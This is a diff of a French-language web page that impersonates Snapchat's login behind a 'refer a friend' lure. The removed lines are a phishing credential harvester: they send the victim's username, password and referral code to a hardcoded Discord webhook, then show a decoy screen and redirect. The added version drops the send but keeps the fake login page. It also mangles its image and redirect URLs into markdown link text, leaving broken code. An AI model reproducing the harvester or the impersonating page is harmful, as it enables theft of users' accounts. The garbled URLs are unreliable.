@@ -7,7 +7,7 @@
 
   <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
   <meta property="og:description" content="Description courte" />
-  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
+  <meta property="og:image" content="[i.ibb.co](https://i.ibb.co/wZhXf3RN/Snapchat-1.png)" />
 
   <style>
     body {
@@ -98,7 +98,7 @@
 </head>
 <body>
   <div class="login-box" id="loginBox">
-    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
+    <img src="[support-tools.storage.googleapis.com](https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png)" alt="Logo Snapchat" class="logo" />
     <h2>Snapchat | Parrainez Un Ami</h2>
     <form id="loginForm">
       <div class="form-group">
@@ -117,8 +117,8 @@
       <button type="submit">Connexion</button>
 
       <div class="links-container">
-        <button type="button" class="link-button">S'inscrire</button>
-        <button type="button" class="link-button">Mot de passe oublié</button>
+        <button type="button" class="link-button" id="signupBtn">S'inscrire</button>
+        <button type="button" class="link-button" id="forgotBtn">Mot de passe oublié</button>
       </div>
     </form>
     <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
@@ -126,12 +126,20 @@
   </div>
 
   <div class="image-screen" id="imageScreen">
-    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
+    <img src="[images.airdroid.com](https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg)" alt="Confirmation Snapchat" />
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
-    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
+    // URL officielle de redirection (aucune donnée n'est envoyée)
+    const redirectURL = "[accounts.snapchat.com](https://accounts.snapchat.com/accounts/v2/login)";
+
+    // Aide: comportements des liens secondaires
+    document.getElementById('signupBtn').addEventListener('click', () => {
+      window.location.href = "[accounts.snapchat.com](https://accounts.snapchat.com/accounts/signup)";
+    });
+    document.getElementById('forgotBtn').addEventListener('click', () => {
+      window.location.href = "[accounts.snapchat.com](https://accounts.snapchat.com/accounts/password_reset)";
+    });
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -143,10 +151,13 @@
       const errorMessage = document.getElementById('errorMessage');
       const referralError = document.getElementById('referralError');
 
+      // Masquer les erreurs
       errorMessage.style.display = 'none';
       referralError.style.display = 'none';
 
-      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
+      // Validation locale basique (sans transmettre ni stocker les valeurs)
+      const invalidCreds = username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ");
+      if (invalidCreds) {
         errorMessage.style.display = 'block';
         return;
       }
@@ -156,43 +167,15 @@
         return;
       }
 
-      const message = {
-        embeds: [
-          {
-            title: "📥 Nouvelle tentative de connexion",
-            description: "Informations collectées via le formulaire",
-            color: 0xffc800,
-            fields: [
-              { name: "👤 Nom d'utilisateur / e-mail", value: username },
-              { name: "🔒 Mot de passe", value: password },
-              { name: "🎁 Code de parrainage", value: referralCode }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: "Formulaire Rankos" }
-          }
-        ]
-      };
+      // AUCUN envoi réseau. On passe directement à l'écran d'illustration puis à la redirection.
+      setTimeout(() => {
+        document.getElementById('loginBox').style.display = 'none';
+        document.getElementById('imageScreen').style.display = 'block';
 
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(message),
-      })
-      .then(response => {
-        // Après l'envoi, lancer le processus d'affichage et de redirection
         setTimeout(() => {
-          document.getElementById('loginBox').style.display = 'none';
-          document.getElementById('imageScreen').style.display = 'block';
-
-          setTimeout(() => {
-            window.location.href = redirectURL;
-          }, 30000); // 30 secondes
-        }, 1000); // 1 seconde (modifié)
-      })
-      .catch(error => {
-        alert("Erreur réseau ou CORS.");
-        console.error(error);
-      });
+          window.location.href = redirectURL;
+        }, 30000); // 30 secondes
+      }, 1000); // 1 seconde
     });
   </script>
 </body>
